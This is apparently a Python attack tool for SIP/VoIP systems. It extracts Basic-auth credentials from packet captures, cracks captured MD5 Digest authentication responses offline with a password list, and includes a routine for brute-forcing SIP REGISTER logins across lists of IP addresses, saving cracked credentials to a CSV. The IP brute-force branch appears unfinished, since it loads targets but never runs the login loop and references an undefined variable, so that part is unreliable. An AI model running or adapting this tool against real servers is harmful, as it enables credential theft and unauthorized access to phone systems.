#! /usr/bin/env python3

import socket
from scapy.all import *
from hashlib import md5
from pickle import dump
from random import choice
from datetime import date
from base64 import b64decode
from multiprocessing import Lock, Pool, cpu_count
from optparse import OptionParser
from colorama import Fore, Back, Style
from time import strftime, localtime, time, sleep

status_color = {
    '+': Fore.GREEN,
    '-': Fore.RED,
    '*': Fore.YELLOW,
    ':': Fore.CYAN,
    ' ': Fore.WHITE
}

def display(status, data, start='', end='\n'):
    print(f"{start}{status_color[status]}[{status}] {Fore.BLUE}[{date.today()} {strftime('%H:%M:%S', localtime())}] {status_color[status]}{Style.BRIGHT}{data}{Fore.RESET}{Style.RESET_ALL}", end=end)

def get_arguments(*args):
    parser = OptionParser()
    for arg in args:
        parser.add_option(arg[0], arg[1], dest=arg[2], help=arg[3])
    return parser.parse_args()[0]

lock = Lock()
threads_number = cpu_count()

allowed_characters = "0123456789abcdef"
numbers = "0123456789"
ending_string = "\r\n\r\n"
register_request_data = f"""REGISTER sip:SIP_SERVER SIP/2.0
Via: SIP/2.0/PROTOCOL SIP_CLIENT
To: <sip:USERID@SIP_SERVER>
From: <sip:USERID@SIP_SERVER>
Call-ID: CALLERID
CSeq: SEQUENCE REGISTER
Contact: <sip:USERID@SIP_CLIENT>;expires=3600{ending_string}"""
register_authorization_data = f"""REGISTER sip:SIP_SERVER SIP/2.0
Via: SIP/2.0/PROTOCOL SIP_CLIENT
To: <sip:USERID@SIP_SERVER>
From: <sip:USERID@SIP_SERVER>
Call-ID: CALLERID
CSeq: SEQUENCE REGISTER
Contact: <sip:USERID@SIP_CLIENT>;expires=3600
Authorization: Digest username="USERID", realm="REALM", nonce="NONCE", uri="URI", response="RESPONSE", algorithm=MD5, cnonce="CNONCE", qop=QOP, nc=NONCECOUNT{ending_string}"""
call_id = "kaptaan@PEACOCK"
server_port = 5060
client_port = 5060
protocol = "UDP"

def calculateDigestResponse(username, password, realm, method, uri, nonce, cnonce, qop, nonce_count):
    hash_1 = md5(f"{username}:{realm}:{password}".encode()).hexdigest()
    hash_2 = md5(f"{method}:{uri}".encode()).hexdigest()
    return md5(f"{hash_1}:{nonce}:{nonce_count}:{cnonce}:{qop}:{hash_2}".encode()).hexdigest()
def calculateDigestResponse_Handler(details):
    cracked_authorizations = []
    for ip, username, realm, method, uri, nonce, cnonce, qop, nonce_count, response in details:
        for password in arguments.password:
            calculated_response = calculateDigestResponse(username, password, realm, method, uri, nonce, cnonce, qop, nonce_count)
            if calculated_response == response:
                cracked_authorizations.append({"ip": ip, "user": username, "password": password})
                with lock:
                    display('+', f"{Back.BLUE}{username}{Back.RESET}:{Back.CYAN}{password}{Back.RESET}@{Back.MAGENTA}{ip}{Back.RESET} => Cracked")
                break
    return cracked_authorizations
def login(server_ip, client_ip, user, password):
    t1 = time()
    try:
        sequence = 0
        sip_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if protocol == "UDP" else socket.SOCK_STREAM)
        sip_socket.bind((client_ip, client_port)) if protocol == "UDP" else sip_socket.connect((server_ip, server_port))
        raw_register_request_data = register_request_data.replace("SIP_SERVER", server_ip).replace("PROTOCOL", protocol).replace("SIP_CLIENT", client_ip).replace("USERID", user).replace("CALLERID", call_id).replace("SEQUENCE", str(sequence))
        sequence += 1
        sip_socket.sendto(raw_register_request_data.encode(), (server_ip, server_port)) if protocol == "UDP" else sip_socket.sendall(raw_register_request_data.encode())
        received_data = sip_socket.recvfrom(65535)[0].decode().split('\n') if protocol == "UDP" else sip_socket.recv(65635).decode().split('\n')
        for line in received_data:
            if "Authenticate" in line:
                line = line[line.find("Digest") + len("Digest "):]
                break
        response_data = {item.strip().split('=')[0].strip(): item.strip().split('=')[1].strip().replace('"', '') for item in line.split(',')}
        qop = response_data["qop"]
        nonce = response_data["nonce"]
        realm = response_data["realm"]
        uri = f"sip:{server_ip}"
        cnonce = ''.join(choice(allowed_characters) for _ in range(8))
        nc = ''.join(choice(numbers) for _ in range(8))
        digest_response = calculateDigestResponse(user, password, realm, "REGISTER", uri, nonce, cnonce, qop, nc)
        raw_register_authorization_data = register_authorization_data.replace("CNONCE", cnonce).replace("NONCECOUNT", nc).replace("SIP_SERVER", server_ip).replace("PROTOCOL", protocol).replace("SIP_CLIENT", client_ip).replace("USERID", user).replace("REALM", realm).replace("NONCE", nonce).replace("URI", uri).replace("RESPONSE", digest_response).replace("QOP", qop).replace("CALLERID", call_id).replace("SEQUENCE", str(sequence))
        sip_socket.sendto(raw_register_authorization_data.encode(), (server_ip, server_port)) if protocol == "UDP" else sip_socket.sendall(raw_register_authorization_data.encode())
        received_data = sip_socket.recvfrom(65535)[0].decode() if protocol == "UDP" else sip_socket.recv(65535).decode()
        sip_socket.close()
        authorization_status = True if "200 OK" in received_data else False
        t2 = time()
        return authorization_status, t2-t1
    except Exception as error:
        t2 = time()
        return error, t2-t1
def loginHandler(client_ip, details):
    group_successful_logins = []
    for detail in details:
        login_status = login(detail["ip"], client_ip, detail["user"], detail["password"])
        if login_status[0] == True:
            group_successful_logins.append(detail)
            with lock:
                display('+', f"{Back.BLUE}{detail['user']}{Back.RESET}:{Back.CYAN}{detail['password']}{Back.RESET}@{Back.MAGENTA}{detail['ip']}{Back.RESET} => Access Granted")
    return group_successful_logins

if __name__ == "__main__":
    arguments = get_arguments(('-i', "--ip", "ip", "File Name of List of IP Addresses (Seperated by ',', either File Name or IP itself)"),
                              ('-C', "--capture-file", "capture_file", "Packet Capture Files (Seperated by ',')"),
                              ('-D', "--capture-file-data", "capture_file_data", "Dump Data Extracted from Capture File in Pickle Format (Optional)"),
                              ('-u', "--user", "user", "Username for Brute Force (Seperated by ',', either File Name or User itself)"),
                              ('-p', "--password", "password", "Password For Brute Force (Seperated by ',', either File Name or Password itself)"),
                              ('-c', "--credentials", "credentials", "Name of File containing Credentials in format ({user}:{password})"),
                              ('-I', "--call-id", "call_id", f"Call ID (Default={call_id})"),
                              ('-S', "--server-port", "server_port", f"Server Port (Default={server_port})"),
                              ('-P', "--client-port", "client_port", f"Client Port (Default={client_port})"),
                              ('-t', "--protocol", "protocol", f"Protocol to Use (TCP/UDP, Default={protocol})"),
                              ('-n', "--network-interface", "network_interface", f"Interface to use (Interfaces Available={','.join(get_if_list())})"),
                              ('-w', "--write", "write", "Name of the CSV File for the Successfully Logged In IPs to be dumped (default=current data and time)"))
    if not arguments.write:
        arguments.write = f"{date.today()} {strftime('%H_%M_%S', localtime())}.csv"
    if not arguments.credentials:
        if not arguments.user and not arguments.capture_file:
            display('-', f"Please specify {Back.YELLOW}Target Users{Back.RESET} or {Back.YELLOW}Network Packet Capture File{Back.RESET}")
            exit(0)
        elif arguments.user:
            try:
                with open(arguments.user, 'r') as file:
                    arguments.user = [user for user in file.read().split('\n') if user != '']
            except FileNotFoundError:
                arguments.user = arguments.user.split(',')
            except:
                display('-', f"Error while Reading File {Back.YELLOW}{arguments.user}{Back.RESET}")
                exit(0)
            display(':', f"Users Loaded = {Back.MAGENTA}{len(arguments.user)}{Back.RESET}")
        if not arguments.password:
            display('*', f"No {Back.MAGENTA}PASSWORD{Back.RESET} Specified")
            display(':', f"Setting Password to {Back.MAGENTA}Blank{Back.RESET}")
            arguments.password = ['']
        else:
            display(':', f"Loading Passwords from File {Back.MAGENTA}{arguments.password}{Back.RESET}")
            try:
                with open(arguments.password, 'rb') as file:
                    arguments.password = [password for password in file.read().decode(errors="ignore").split('\n') if password != '']
            except FileNotFoundError:
                arguments.password = arguments.password.split(',')
            except Exception as error:
                display('-', f"Error while Reading File {Back.YELLOW}{arguments.password}{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
                exit(0)
            display(':', f"Passwords Loaded = {Back.MAGENTA}{len(arguments.password)}{Back.RESET}")
        if arguments.user:
            arguments.credentials = []
            for user in arguments.user:
                for password in arguments.password:
                    arguments.credentials.append([user, password])
    else:
        try:
            with open(arguments.credentials, 'r') as file:
                arguments.credentials = [[credential.split(':')[0], ':'.join(credential.split(':')[1:])] for credential in file.read().split('\n') if len(credential.split(':')) > 1]
        except:
            display('-', f"Error while Reading File {Back.YELLOW}{arguments.credentials}{Back.RESET}")
            exit(0)
    if arguments.call_id:
        call_id = arguments.call_id
        register_request_data = register_request_data.replace("CALLERID", call_id)
        register_authorization_data = register_authorization_data.replace("CALLERID", call_id)
    if arguments.server_port:
        server_port = int(arguments.server_port)
    if arguments.client_port:
        client_port = int(arguments.client_port)
    if not arguments.ip and not arguments.capture_file:
        display('-', "Please Provide a List of IP Addresses or Network Packet Capture File")
        exit(0)
    elif arguments.capture_file:
        sip_devices = {}
        sip_authentications = {}
        for packet_capture_file in arguments.capture_file.split(','):
            try:
                packets = rdpcap(packet_capture_file)
                for network_packet in packets:
                    try:
                        if Raw in network_packet and "SIP" in network_packet[Raw].load.decode():
                            device_id = tuple(sorted([network_packet[IP].src, network_packet[IP].dst, str(network_packet[TCP].sport), str(network_packet[TCP].dport)])) if TCP in network_packet else tuple(sorted([network_packet[IP].src, network_packet[IP].dst, str(network_packet[UDP].sport), str(network_packet[UDP].dport)]))
                            if "200 OK" in network_packet[Raw].load.decode() and device_id in sip_authentications:
                                sip_devices[device_id] = sip_authentications[device_id]
                            if "Authorization" in network_packet[Raw].load.decode():
                                raw_data = network_packet[Raw].load.decode().split('\n')
                                method = raw_data[0].split(' ')[0]
                                for line in raw_data:
                                    if "Authorization" in line and "digest" in line.lower():
                                        line = line[len("Authorization: Digest "):]
                                        sip_authentications[device_id] = {parameter.split('=')[0]: ' '.join(parameter.split('=')[1:]).replace('"', '') for parameter in line.split(', ')}
                                        sip_authentications[device_id]["method"] = method
                                        sip_authentications[device_id]["authorization"] = "DIGEST"
                                        sip_authentications[device_id]["device"] = network_packet[IP].dst
                                        sip_authentications[device_id]["source"] = network_packet[IP].src
                                        sip_authentications[device_id]["device_port"] = network_packet[TCP].dport if TCP in network_packet else network_packet[UDP].dport
                                        sip_authentications[device_id]["source_port"] = network_packet[TCP].sport if TCP in network_packet else network_packet[UDP].sport
                                        break
                                    elif "Authorization" in line:
                                        authorization = "BASIC"
                                        base64 = b64decode(line[len("Authorization: Basic "):].encode()).decode()
                                        username, password = base64.split(':')[0], ':'.join(base64.split(':')[1:])
                                        sip_authentications[device_id] = {
                                            "username": username,
                                            "password": password,
                                            "method": method,
                                            "authorization": authorization,
                                            "device": network_packet[IP].dst,
                                            "source": network_packet[IP].src,
                                            "device_port": network_packet[TCP].dport if TCP in network_packet else network_packet[UDP].dport,
                                            "source_port": network_packet[TCP].sport if TCP in network_packet else network_packet[UDP].sport
                                        }
                                        break
                    except:
                        pass
            except Exception as error:
                display('-', f"Error Occured while reading Packet Capture File {Back.MAGENTA}{packet_capture_file}{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
        del sip_authentications
        sip_devices = list(sip_devices.values())
        successful_logins = []
        for sip_device in sip_devices:
            print(Fore.CYAN + '-'*100 + Fore.RESET)
            display('*', f"SIP Device => {Back.MAGENTA}{sip_device['device']}{Back.RESET}")
            display('*', f"SIP Client => {Back.MAGENTA}{sip_device['source']}{Back.RESET}")
            display('*', f"SIP Device Port => {Back.MAGENTA}{sip_device['device_port']}{Back.RESET}")
            display('*', f"SIP Client Port => {Back.MAGENTA}{sip_device['source_port']}{Back.RESET}")
            display('+', f"Method => {Back.MAGENTA}{sip_device['method']}{Back.RESET}")
            display('+', f"Authorization => {Back.MAGENTA}{sip_device['authorization']}{Back.RESET}")
            if sip_device['authorization'] == "DIGEST":
                display(':', f"\t* Username = {Back.MAGENTA}{sip_device['username']}{Back.RESET}")
                display(':', f"\t* Realm = {Back.MAGENTA}{sip_device['realm']}{Back.RESET}")
                display(':', f"\t* Nonce = {Back.MAGENTA}{sip_device['nonce']}{Back.RESET}")
                display(':', f"\t* URI = {Back.MAGENTA}{sip_device['uri']}{Back.RESET}")
                display(':', f"\t* Response = {Back.MAGENTA}{sip_device['response']}{Back.RESET}")
                display(':', f"\t* Algorithm = {Back.MAGENTA}{sip_device['algorithm']}{Back.RESET}")
                display(':', f"\t* Client Nonce = {Back.MAGENTA}{sip_device['cnonce']}{Back.RESET}")
                display(':', f"\t* QOP = {Back.MAGENTA}{sip_device['qop']}{Back.RESET}")
                display(':', f"\t* Nonce Count = {Back.MAGENTA}{sip_device['nc']}{Back.RESET}")
                sip_device['nc'] = sip_device['nc'].strip()
            else:
                display(':', f"\t* Username = {Back.MAGENTA}{sip_device['username']}{Back.RESET}")
                display(':', f"\t* Password = {Back.MAGENTA}{sip_device['password']}{Back.RESET}")
                successful_logins.append({"ip": sip_device["device"], "user": sip_device["username"], "password": sip_device["password"]})
            print(Fore.CYAN + '-'*100 + Fore.RESET)
        if arguments.capture_file_data:
            with open(arguments.capture_file_data, 'wb') as file:
                dump(sip_devices, file)
        pool = Pool(threads_number)
        threads = []
        sip_devices = [[sip_device["source"], sip_device["username"], sip_device["realm"], sip_device["method"], sip_device["uri"], sip_device["nonce"], sip_device["cnonce"], sip_device["qop"], sip_device["nc"], sip_device["response"].strip()] for sip_device in sip_devices if sip_device["authorization"] == "DIGEST"]
        total_sip_devices = len(sip_devices)
        sip_devices_divisions = [sip_devices[index*total_sip_devices//threads_number: (index+1)*total_sip_devices//threads_number] for index in range(threads_number)]
        for index, sip_devices_division in enumerate(sip_devices_divisions):
            threads.append(pool.apply_async(calculateDigestResponse_Handler, (sip_devices_division, )))
        for thread in threads:
            successful_logins.extend(thread.get())
        pool.close()
        pool.join()
    else:
        if arguments.network_interface not in get_if_list():
            display('-', f"Please Provide {Back.MAGENTA}Network Interface{Back.RESET} to use!")
            display('*', f"Network Interfaces Available => {Back.MAGENTA}{','.join(get_if_list())}{Back.RESET}")
            exit(0)
        clinet_ip = get_if_addr(arguments.network_interface)
        if arguments.protocol == "TCP":
            protocol = "TCP"
        else:
            threads_number = 1
        ips = []
        for ip_detail in arguments.ip.split(','):
            try:
                with open(ip_detail, 'r') as file:
                    display(':', f"Loading IPs from File {Back.MAGENTA}{ip_detail}{Back.RESET}")
                    current_ips = file.read().split('\n')
                    ips.extend(current_ips)
                    display('+', f"IPs Loaded = {Back.MAGENTA}{len(current_ips)}{Back.RESET}")
            except FileNotFoundError:
                ips.append(ip_detail)
            except Exception as error:
                display('-', f"Error Loading IPs from File {Back.YELLOW}{arguments.ip}{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
                exit(0)
    if len(successful_logins) > 0:
        display(':', f"Dumping Successfully Authorized IP Addresses in file {Back.MAGENTA}{arguments.write}{Back.RESET}", start='\n')
        with open(arguments.write, 'w') as file:
            file.write("User,Password,IP\n")
            file.write('\n'.join([f"{login['user']},{login['password']},{login['ip']}" for login in successful_logins]))
        display('+', f"Dumped Successfully Authorized IP Addresses in file {Back.MAGENTA}{arguments.write}{Back.RESET}")